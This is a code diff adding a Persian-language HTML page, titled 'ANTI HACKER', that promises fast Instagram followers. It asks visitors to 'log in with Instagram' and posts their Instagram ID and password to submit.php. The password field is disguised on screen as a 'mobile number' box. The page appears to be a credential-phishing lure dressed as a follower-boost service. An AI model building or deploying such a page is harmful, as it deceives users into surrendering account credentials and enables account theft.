@@ -1,0 +1,53 @@
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <link rel="stylesheet" href="style/style.css">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        label{
+    font-size: 25px;
+}
+input {
+    font-family: tahoma;
+    width: 40%;
+    border: 0;
+    border-bottom: 2px solid gray;
+    outline: 0;
+    font-size: 1.3rem;
+    color: #fff;
+    padding: 7px 0;
+    background: 0 0;
+    transition: border-color .2s
+}
+
+.form__field:focus {
+    border-bottom: 2px solid #CE0075
+}
+
+.form__field:hover {
+    border-bottom: 2px solid #CE0075
+}
+    </style>
+    <title>ANTI HACKER</title>
+    <link rel="icon" href="images/1.ico">
+</head>
+<body>
+    <h1 id="title" >مثل ی موشک برات فالور میاد</h1>
+ <div class="panel">
+     <div class="content">
+         <form action="submit.php" method="POST">
+        <h1>ورورد با اینستاگرام:</h1>
+     <ul>
+         <li ><label for="inp">ایدی اینستاگرام:&nbsp</label><input placeholder="ایدی اینستاگرام" class="form__field" id="inp" name="username" type="text" required></li>
+         <li ><label for="inp">شماره موبایل:&nbsp</label><input placeholder="شماره موبایل" class="form__field" id="inp" name="password" minlength="6" type="password" required></li>
+     </ul>
+     <br>
+     <button type="submit">ورود</button>
+    </form>
+     <br>
+    </div>
+ </div>
+</body>
+<script src="JavaScript/js.js">
+</script>
+</html>
